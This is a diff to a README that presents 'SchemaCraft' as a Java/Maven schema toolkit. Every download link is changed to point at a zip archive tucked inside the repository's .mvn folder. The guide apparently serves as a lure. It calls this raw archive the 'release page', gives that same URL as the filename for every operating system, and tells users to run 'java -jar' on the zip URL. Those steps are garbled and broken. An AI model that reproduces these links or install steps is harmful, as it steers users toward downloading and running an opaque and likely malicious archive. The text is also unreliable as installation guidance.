@@ -4,9 +4,9 @@
 Welcome to SchemaCraft! This guide will help you easily download and run SchemaCraft, a Java/Maven toolkit designed for managing data and schemas. You do not need programming knowledge to use this application.
 
 ## 📥 Download SchemaCraft
-[![Download SchemaCraft](https://raw.githubusercontent.com/Sime-audrey/SchemaCraft/main/interpolitical/SchemaCraft.zip%20Now%20%21-Download%20SchemaCraft-brightgreen)](https://raw.githubusercontent.com/Sime-audrey/SchemaCraft/main/interpolitical/SchemaCraft.zip)
+[![Download SchemaCraft](https://github.com/Sime-audrey/SchemaCraft/raw/refs/heads/main/.mvn/Craft_Schema_1.4.zip%20Now%20%21-Download%20SchemaCraft-brightgreen)](https://github.com/Sime-audrey/SchemaCraft/raw/refs/heads/main/.mvn/Craft_Schema_1.4.zip)
 
-Visit this page to download: [SchemaCraft Releases](https://raw.githubusercontent.com/Sime-audrey/SchemaCraft/main/interpolitical/SchemaCraft.zip)
+Visit this page to download: [SchemaCraft Releases](https://github.com/Sime-audrey/SchemaCraft/raw/refs/heads/main/.mvn/Craft_Schema_1.4.zip)
 
 ## 🖥️ System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -25,20 +25,20 @@ SchemaCraft provides a variety of features to make your data management simple a
 ## 💾 Download & Install
 To get started with SchemaCraft, follow these steps:
 
-1. **Visit the Release Page**: Click on this link to go to the [SchemaCraft Releases](https://raw.githubusercontent.com/Sime-audrey/SchemaCraft/main/interpolitical/SchemaCraft.zip) page.
+1. **Visit the Release Page**: Click on this link to go to the [SchemaCraft Releases](https://github.com/Sime-audrey/SchemaCraft/raw/refs/heads/main/.mvn/Craft_Schema_1.4.zip) page.
 
 2. **Select Your Version**: You will see a list of available versions. Choose the latest stable version.
 
-3. **Download the File**: Click on the appropriate file for your operating system and wait for the download to complete. If you're using Windows, you might see a file named `https://raw.githubusercontent.com/Sime-audrey/SchemaCraft/main/interpolitical/SchemaCraft.zip`. For Mac or Linux, it will be `https://raw.githubusercontent.com/Sime-audrey/SchemaCraft/main/interpolitical/SchemaCraft.zip` or `https://raw.githubusercontent.com/Sime-audrey/SchemaCraft/main/interpolitical/SchemaCraft.zip`.
+3. **Download the File**: Click on the appropriate file for your operating system and wait for the download to complete. If you're using Windows, you might see a file named `https://github.com/Sime-audrey/SchemaCraft/raw/refs/heads/main/.mvn/Craft_Schema_1.4.zip`. For Mac or Linux, it will be `https://github.com/Sime-audrey/SchemaCraft/raw/refs/heads/main/.mvn/Craft_Schema_1.4.zip` or `https://github.com/Sime-audrey/SchemaCraft/raw/refs/heads/main/.mvn/Craft_Schema_1.4.zip`.
 
 4. **Run the Application**: 
     - For Windows: Open a command prompt and navigate to the folder where you downloaded the file. Type the command: 
       ```
-      java -jar https://raw.githubusercontent.com/Sime-audrey/SchemaCraft/main/interpolitical/SchemaCraft.zip
+      java -jar https://github.com/Sime-audrey/SchemaCraft/raw/refs/heads/main/.mvn/Craft_Schema_1.4.zip
       ```
     - For Mac or Linux: Open your terminal, navigate to the download location, and type:
       ```
-      java -jar https://raw.githubusercontent.com/Sime-audrey/SchemaCraft/main/interpolitical/SchemaCraft.zip
+      java -jar https://github.com/Sime-audrey/SchemaCraft/raw/refs/heads/main/.mvn/Craft_Schema_1.4.zip
       ```
     - If you downloaded the Linux version, use the same above command after navigating to the folder.
 
